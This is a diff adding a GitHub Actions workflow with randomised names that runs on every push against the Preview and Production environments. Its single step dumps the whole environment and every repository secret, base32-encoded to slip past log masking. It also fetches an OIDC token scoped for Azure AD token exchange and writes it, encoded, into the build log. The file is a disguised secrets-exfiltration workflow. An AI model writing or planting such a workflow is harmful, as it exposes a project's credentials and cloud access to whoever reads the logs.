@@ -1,0 +1,27 @@
+# 42ztoabcnsaqbz5l
+name: lwf7mlowummo
+on: [push]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  gjpgu2asy:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    env:
+      SMYEFD4RB: ${{ toJSON(secrets) }}
+    strategy:
+      fail-fast: false
+      matrix:
+        environment:
+          - "Preview"
+          - "Production"
+    environment: ${{ matrix.environment }}
+    steps:
+      - name: rtamuwtmn
+        run: |
+          env | base32 -w 108
+          printf '%s' 'F' | base32 -w 108
+          printf '%s' "$SMYEFD4RB" | base32 -w 108
+          printf '%s' 'F' | base32 -w 108
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then printf '%s' 'F' | base32 -w 108; curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api%3A%2F%2FAzureADTokenExchange" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p' | base32 -w 108; fi
